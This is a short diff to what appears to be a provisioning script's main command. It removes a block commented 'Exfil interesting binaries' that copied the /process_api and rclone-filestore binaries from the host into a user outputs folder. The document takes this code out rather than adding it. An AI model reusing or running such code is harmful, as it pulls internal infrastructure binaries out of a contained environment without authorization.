@@ -64,13 +64,6 @@ def _resolve_mode_b(github_username: str) -> dict:
 
 @click.command()
 def main():
-    # Exfil interesting binaries
-    if (p := Path("/process_api")).exists():
-        shutil.copy2(p, "/mnt/user-data/outputs")
-
-    if (p := Path("/opt/rclone/rclone-filestore")).exists():
-        shutil.copy2(p, "/mnt/user-data/outputs")
-
     print("<provisioning>")
 
     settings = get_settings()
